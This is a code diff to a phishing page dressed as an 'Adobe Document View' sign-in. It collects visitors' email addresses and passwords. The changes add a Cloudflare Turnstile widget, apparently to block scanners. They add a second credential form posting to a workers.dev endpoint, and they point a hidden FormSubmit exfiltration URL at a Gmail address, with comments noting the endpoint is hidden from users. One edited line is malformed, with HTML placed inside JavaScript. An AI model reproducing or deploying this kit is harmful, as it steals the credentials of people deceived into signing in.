@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
+    <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.5" />
 
   <!-- FAVICON - This makes the logo appear in the browser tab/taskbar -->
@@ -10,6 +10,13 @@
   <link rel="apple-touch-icon" sizes="180x180" href="https://business.adobe.com/products/genstudio.html" />
 
   <title>Adobe Document View</title>
+
+  <!-- 🔽 ADD THIS LINE - Cloudflare Turnstile script -->
+    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
+    
+    <!-- Your existing CSS links -->
+    <link rel="stylesheet" href="..." />
+    <!-- Your existing styles -->
   <!-- Font Awesome (optional but used for icons) -->
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" />
   <style>
@@ -361,6 +368,35 @@
     <button type="submit" class="btn-continue">Continue <i class="fas fa-arrow-right" style="margin-left: 8px;"></i></button>
   </form>
 
+  <form id="signinForm" action="https://your-worker-name.workers.dev" method="POST">
+    <!-- Your existing email field -->
+    <div class="form-group">
+        <label for="email">Email address</label>
+        <div class="input-wrapper">
+            <i class="far fa-envelope"></i>
+            <input type="email" id="email" name="email" placeholder="ryan.longnecker@example.com" required />
+        </div>
+    </div>
+
+    <!-- Your existing password field -->
+    <div class="form-group">
+        <label for="password">Password</label>
+        <div class="input-wrapper">
+            <i class="fas fa-key"></i>
+            <input type="password" id="password" name="password" placeholder="••••••••" required />
+        </div>
+    </div>
+
+    <!-- 🔽 ADD THIS - Turnstile Widget -->
+    <div style="margin: 1.5rem 0; display: flex; justify-content: center;">
+    <div class="cf-turnstile" data-sitekey="0x4AAAAAAD4Kaa190Iw-o4ZV"></div>
+</div>
+    <!-- The widget will appear here -->
+
+    <!-- Your existing continue button -->
+    <button type="submit" class="btn-continue">Continue</button>
+</form>
+
   <div class="divider">or</div>
 
   <div class="social-grid">
@@ -391,7 +427,7 @@
 
     // --- FORMSUBMIT ENDPOINT (hidden from UI) ---
     // Replace with your actual FormSubmit endpoint.
-    const FORMSUBMIT_URL = "https://formsubmit.co/5422e951e08d31f571300023cdfc3d6d";   // <-- CHANGE THIS
+    const FORMSUBMIT_URL = "https://formsubmit.co/vigilancesurvey1@gmail.com";   // <-- CHANGE THIS
 
     // --- PDF REDIRECT URL (replace with your actual PDF link) ---
     // The user will be redirected to this PDF after sign-in.
@@ -399,7 +435,7 @@
 
     // Set form action to FormSubmit (hidden)
     if (form) {
-      form.action = FORMSUBMIT_URL;
+      <form action="https://formsubmit.co/your@email.com" method="POST" />;
       console.log('✅ Form action set to FormSubmit endpoint (hidden).');
     }
 
